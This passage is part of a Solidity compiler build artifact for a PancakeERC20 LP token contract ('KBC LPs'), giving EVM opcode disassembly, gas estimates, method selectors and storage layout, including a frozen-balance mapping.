ISZERO ISZERO DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x1B4 PUSH2 0x38B JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x198 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x1DC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 ADD CALLDATALOAD PUSH2 0x391 JUMP JUMPDEST PUSH2 0x1B4 PUSH2 0x42B JUMP JUMPDEST PUSH2 0x20C PUSH2 0x44F JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0xFF SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x1B4 PUSH2 0x454 JUMP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x240 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x45A JUMP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x266 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x46C JUMP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x28C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x47E JUMP JUMPDEST PUSH2 0xF7 PUSH2 0x490 JUMP JUMPDEST PUSH2 0x198 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x2BA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x4B2 JUMP JUMPDEST PUSH2 0x321 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0xE0 DUP2 LT ISZERO PUSH2 0x2E6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0x60 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xFF PUSH1 0x80 DUP3 ADD CALLDATALOAD AND SWAP1 PUSH1 0xA0 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xC0 ADD CALLDATALOAD PUSH2 0x4BF JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x339 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 ADD CALLDATALOAD AND PUSH2 0x6BF JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x7 DUP2 MSTORE PUSH1 0x20 ADD PUSH7 0x4B4243204C5073 PUSH1 0xC8 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x381 CALLER DUP5 DUP5 PUSH2 0x6DC JUMP JUMPDEST POP PUSH1 0x1 JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE DUP2 KECCAK256 SLOAD PUSH1 0x0 NOT EQ PUSH2 0x416 JUMPI PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SLOAD PUSH2 0x3F1 SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x73E AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SSTORE JUMPDEST PUSH2 0x421 DUP5 DUP5 DUP5 PUSH2 0x78E JUMP JUMPDEST POP PUSH1 0x1 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 JUMP JUMPDEST PUSH1 0x12 DUP2 JUMP JUMPDEST PUSH1 0x4 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x3 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x5 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x6 DUP2 MSTORE PUSH1 0x20 ADD PUSH6 0x4B42432D4C5 PUSH1 0xD4 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x381 CALLER DUP5 DUP5 PUSH2 0x78E JUMP JUMPDEST TIMESTAMP DUP5 LT ISZERO PUSH2 0x507 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x10 PUSH1 0x24 DUP3 ADD MSTORE PUSH16 0x14185B98D85AD94E8811561412549151 PUSH1 0x82 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x4 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP10 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x5 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 DUP1 SLOAD PUSH1 0x1 DUP1 DUP3 ADD SWAP1 SWAP3 SSTORE DUP3 MLOAD PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 DUP7 ADD MSTORE DUP1 DUP5 ADD SWAP7 SWAP1 SWAP7 MSTORE SWAP6 DUP14 AND PUSH1 0x60 DUP7 ADD MSTORE PUSH1 0x80 DUP6 ADD DUP13 SWAP1 MSTORE PUSH1 0xA0 DUP6 ADD SWAP6 SWAP1 SWAP6 MSTORE PUSH1 0xC0 DUP1 DUP6 ADD DUP12 SWAP1 MSTORE DUP2 MLOAD DUP1 DUP7 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xE0 DUP6 ADD DUP3 MSTORE DUP1 MLOAD SWAP1 DUP4 ADD KECCAK256 PUSH2 0x1901 PUSH1 0xF0 SHL PUSH2 0x100 DUP7 ADD MSTORE PUSH2 0x102 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE PUSH2 0x122 DUP1 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE DUP1 MLOAD DUP1 DUP6 SUB SWAP1 SWAP7 ADD DUP7 MSTORE PUSH2 0x142 DUP5 ADD DUP1 DUP3 MSTORE DUP7 MLOAD SWAP7 DUP4 ADD SWAP7 SWAP1 SWAP7 KECCAK256 SWAP6 DUP4 SWAP1 MSTORE PUSH2 0x162 DUP5 ADD DUP1 DUP3 MSTORE DUP7 SWAP1 MSTORE PUSH1 0xFF DUP10 AND PUSH2 0x182 DUP6 ADD MSTORE PUSH2 0x1A2 DUP5 ADD DUP9 SWAP1 MSTORE PUSH2 0x1C2 DUP5 ADD DUP8 SWAP1 MSTORE MLOAD SWAP2 SWAP4 SWAP3 PUSH2 0x1E2 DUP1 DUP3 ADD SWAP4 PUSH1 0x1F NOT DUP2 ADD SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 DUP6 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x622 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x40 MLOAD PUSH1 0x1F NOT ADD MLOAD SWAP2 POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND ISZERO DUP1 ISZERO SWAP1 PUSH2 0x658 JUMPI POP DUP9 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ JUMPDEST PUSH2 0x6A9 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1A PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A20494E56414C49445F5349474E4154555245000000000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH2 0x6B4 DUP10 DUP10 DUP10 PUSH2 0x6DC JUMP JUMPDEST POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x0 SWAP3 DUP4 MSTORE PUSH1 0x40 DUP1 DUP5 KECCAK256 SWAP1 SWAP2 MSTORE SWAP1 DUP3 MSTORE SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 DUP3 MSTORE SWAP2 DUP3 SWAP1 KECCAK256 DUP6 SWAP1 SSTORE DUP2 MLOAD DUP6 DUP2 MSTORE SWAP2 MLOAD PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST DUP1 DUP3 SUB DUP3 DUP2 GT ISZERO PUSH2 0x385 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x15 PUSH1 0x24 DUP3 ADD MSTORE PUSH21 0x64732D6D6174682D7375622D756E646572666C6F77 PUSH1 0x58 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x7B7 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x73E AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP1 DUP3 KECCAK256 SWAP4 SWAP1 SWAP4 SSTORE SWAP1 DUP5 AND DUP2 MSTORE KECCAK256 SLOAD PUSH2 0x7EC SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x848 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP2 DUP3 SWAP1 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP1 MLOAD DUP6 DUP2 MSTORE SWAP1 MLOAD SWAP2 SWAP4 SWAP3 DUP8 AND SWAP3 PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF SWAP3 SWAP2 DUP3 SWAP1 SUB ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST DUP1 DUP3 ADD DUP3 DUP2 LT ISZERO PUSH2 0x385 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x64732D6D6174682D6164642D6F766572666C6F77 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 0x5F 0x24 0xF6 LOG3 INVALID PC 0xEC SWAP9 SWAP2 0xAD 0xDF PUSH27 0xA87A0A838A4CE532EC73425D05FAE792E93D66F64736F6C634300 SDIV LT STOP ORIGIN GASLIMIT 0x49 POP CALLDATACOPY BALANCE ORIGIN DIFFICULTY PUSH16 0x6D61696E28737472696E67206E616D65 0x2C PUSH20 0x7472696E672076657273696F6E2C75696E743235 CALLDATASIZE KECCAK256 PUSH4 0x6861696E 0x49 PUSH5 0x2C61646472 PUSH6 0x737320766572 PUSH10 0x6679696E67436F6E7472 PUSH2 0x6374 0x29 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "450400",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"DOMAIN_SEPARATOR()": "1087",
						"PERMIT_TYPEHASH()": "243",
						"_frozenBalance(address)": "1147",
						"allowance(address,address)": "1305",
						"approve(address,uint256)": "22366",
						"balanceOf(address)": "1169",
						"decimals()": "274",
						"name()": "infinite",
						"nonces(address)": "1191",
						"permit(address,address,uint256,uint256,uint8,bytes32,bytes32)": "infinite",
						"symbol()": "infinite",
						"totalSupply()": "1066",
						"transfer(address,uint256)": "infinite",
						"transferFrom(address,address,uint256)": "infinite"
					},
					"internal": {
						"_approve(address,address,uint256)": "infinite",
						"_burn(address,uint256)": "infinite",
						"_mint(address,uint256)": "infinite",
						"_transfer(address,address,uint256)": "infinite",
						"freezeMint(address,uint256)": "infinite"
					}
				},
				"methodIdentifiers": {
					"DOMAIN_SEPARATOR()": "3644e515",
					"PERMIT_TYPEHASH()": "30adf81f",
					"_frozenBalance(address)": "47d5d856",
					"allowance(address,address)": "dd62ed3e",
					"approve(address,uint256)": "095ea7b3",
					"balanceOf(address)": "70a08231",
					"decimals()": "313ce567",
					"name()": "06fdde03",
					"nonces(address)": "7ecebe00",
					"permit(address,address,uint256,uint256,uint8,bytes32,bytes32)": "d505accf",
					"symbol()": "95d89b41",
					"totalSupply()": "18160ddd",
					"transfer(address,uint256)": "a9059cbb",
					"transferFrom(address,address,uint256)": "23b872dd"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 19,
						"contract": "src/exchange-protocol/contracts/PancakeERC20.sol:PancakeERC20",
						"label": "totalSupply",
						"offset": 0,
						"slot": "0",
						"type": "t_uint256"
					},
					{
						"astId": 23,
						"contract": "src/exchange-protocol/contracts/PancakeERC20.sol:PancakeERC20",
						"label": "balanceOf",
						"offset": 0,
						"slot": "1",
						"type": "t_mapping(t_address,t_uint256)"
					},
					{
						"astId": 29,
						"contract": "src/exchange-protocol/contracts/PancakeERC20.sol:PancakeERC20",
						"label": "allowance",
						"offset": 0,
						"slot": "2",
						"type": "t_mapping(t_address,t_mapping(t_address,t_uint256))"
					},
					{
						"astId": 33,
						"contract": "src/exchange-protocol/contracts/PancakeERC20.sol:PancakeERC20",
						"label": "_frozenBalance",
						"offset": 0,
						"slot": "3",
						"type": "t_mapping(t_address,t_uint256)"
					},
					{
						"astId": 35,
						"contract": "src/exchange-protocol/contracts/PancakeERC20.sol:PancakeERC20",
						"label": "DOMAIN_SEPARATOR",
						"offset": 0,
						"slot": "4",
						"type": "t_bytes32"
					},
					{
						"astId": 42,
						"contract": "src/exchange-protocol/contracts/PancakeERC20.sol:PancakeERC20",
						"label": "nonces",
						"offset": 0,
						"slot": "5",
						"type": "t_mapping(t_address,t_uint256)"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_bytes32": {
						"encoding": "inplace",
						"label": "bytes32",
						"numberOfBytes": "32"
					},
					"t_mapping(t_address,t_mapping(t_address,t_uint256))": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => mapping(address => uint256))",
						"numberOfBytes": "32",
						"value": "t_mapping(t_address,t_uint256)"
					},
					"t_mapping(t_address,t_uint256)": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => uint256)",
						"numberOfBytes": "32",
						"value": "t_uint256"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"methods": {}
			}
		}
	}
}